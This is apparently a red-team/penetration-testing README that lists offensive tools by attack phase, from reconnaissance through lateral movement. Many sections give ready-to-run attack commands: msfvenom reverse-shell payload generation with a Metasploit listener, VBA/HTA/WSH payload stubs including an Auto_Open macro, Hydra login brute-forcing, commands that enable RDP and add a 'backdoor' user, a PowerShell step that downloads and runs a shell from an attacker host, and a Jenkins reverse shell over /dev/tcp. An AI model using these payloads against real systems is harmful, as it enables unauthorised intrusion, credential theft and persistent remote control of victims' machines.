# RedTeam-Tools

*Tools and Techniques for Red Team / Penetration Testing*

---------------
# Table of Contents

1. [Reconnaissance](#reconnaissance)
    - crt.sh -> httprobe -> EyeWitness
    - nuclei
    - gobuster
    - dnsrecon
    - Shodan.io
    - AORT (All in One Recon Tool)
2. [Resource Development](#resource-development)
    - msfvenom
    - WSH
    - HTA
    - VBA
3. [Initial Access](#initial-access)
    - EvilGoPhish
    - The Social-Engineer Toolkit
    - Hydra
4. [Execution](#execution)
    - .
5. [Persistence](#persistence)
    - .
6. [Privilege Escalation](#privilege-escalation)
    - LinPEAS
    - linux-smart-enumeration
    - WinPEAS
7. [Defense Evasion](#defense-evasion)
    - .
8. [Credential Access](#credential-access)
    - .
9. [Discovery](#discovery)
    - PCredz
    - PingCastle
10. [Lateral Movement](#lateral-movement)
    - crackmapexec
    - Enabling RDP
    - Upgrading shell to meterpreter
    - Forwarding Ports
    - Jenkins reverse shell
11. [Collection](#collection)
    - .
12. [Command and Control](#command-and-control)
    - .
13. [Exfiltration](#exfiltration)
    - .
14. [Impact](#impact)
    - .
15. [Buffer Overflow](#buffer-overflow)
    - .
    
Reconnaissance
====================

* crt.sh -> httprobe -> EyeWitness

	I have put together a bash one-liner that: 
    - Passively collects a list of subdomains from certificate associations ([crt.sh](https://crt.sh/))
    - Actively requests each subdomain to verify it's existance ([httprobe](https://github.com/tomnomnom/httprobe))
    - Actively screenshots each subdomain for manual review ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))
    
    `domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web`
    
    *Note: You must have [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) and [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) installed and change 'DOMAIN_COM' to the target domain. You are able to run this script concurrently in terminal windows if you have multiple target root domains*
	
	![image](https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png)

	![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)

* [nuclei](https://github.com/projectdiscovery/nuclei)

	Fast vulnerability scanner that uses .yaml templates to search for specific issues.
	
	**Install:** `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest`
	
	**Use:** `cat domains.txt | nuclei -t /PATH/nuclei-templates/`
	
	![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)


* [gobuster](https://www.kali.org/tools/gobuster/)

	Nice tool for brute forcing file/folder paths on a victim website.
	
	`gobuster dir -u https://google.com -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20`

	![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)


* [dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)

	dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.
	
	![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)

* [shodan.io](https://www.shodan.io/dashboard)

	Shodan crawls public infrastructure and displays it in a searchable format. Using a company name, domain name, IP address it is possible to discover potentially vulnerable systems relating to your target via shodan.
	
	![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)

* [AORT](https://github.com/D3Ext/AORT)

	Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.
	
	![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)

Resource Development
====================

* [msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

	Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.
	
	**Set Up Listener**
	
	```
	use exploit/multi/handler 
	set PAYLOAD windows/meterpreter/reverse_tcp 
	set LHOST your-ip 
	set LPORT listening-port 
	run
	```
	
	**msfvenmo commands**
	
	**PHP:** `msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R`
	
	**Windows:** `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`
	
	**Linux:** `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
	
	**Java:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`
	
	**HTA:** `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta`
	
	![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)

* WSH
	
	**Creating payload:** 
	
	```
	Set shell = WScript.CreateObject("Wscript.Shell")
	shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
	```

	**Execute:** 
	
	`c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs`
	
	`c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs`
	
	If .vbs are blacklisted `c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt`
	
* HTA

	**Creating payload:**
	
	```
	<html>
	<body>
	<script>
		var c= 'cmd.exe'
		new ActiveXObject('WScript.Shell').Run(c);
	</script>
	</body>
	</html>
	```
	
	**Execute:** Run file

* VBA

	**Creating payload:**

	```
	Sub calc()
		Dim payload As String
		payload = "calc.exe"
		CreateObject("Wscript.Shell").Run payload,0
	End Sub
	```
	
	**Execute:** Set function to Auto_Open() in macro enabled document

Initial Access
====================

* [EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)

	evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication
    
	![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)
    
* [Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)

	This framework is great for creating campaigns for initial access, 'SET has a number of custom attack vectors that allow you to make a believable attack quickly'.

	![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)

* [Hydra](https://github.com/vanhauser-thc/thc-hydra)

	Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.
	
	```
	hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
	hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
	```

	![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)

Privilege Escalation
====================

* [LinPEAS](https://github.com/carlospolop/PEASS-ng)

	LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints. 
	
	![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)

* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

	Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.
	
	![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)


* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

	WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints. 

	![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)


Discovery
====================

* [PCredz](https://github.com/lgandx/PCredz)

	This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.

    ![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)

* [PingCastle](https://github.com/vletoux/pingcastle)

	Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.

	![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)

Lateral Movement
====================

* [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)
	
	This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.
	
	![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)

* Enabling RDP

	`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
	`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
	`net localgroup "Remote Desktop Users" "backdoor" /add`

* Upgrading shell to meterpreter

	Shells (https://infinitelogins.com/tag/payloads/)

	After getting basic shell access to an endpoint a meterpreter is nicer to continue with.
	
	[attacker]Generate a meterpreter shell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe` `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
	
	![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)

	[victim]Download to victim endpoint: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
	
	[attacker]Configure listener: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`
	
	[victim]Execute payload:`Start-Process "shell-name.exe"`
	
	![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)

* Forwarding Ports	
	
	Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.
	
	```
	socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
	socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
	```

* Jenkins reverse shell

	If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.
	
	```
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()
	```
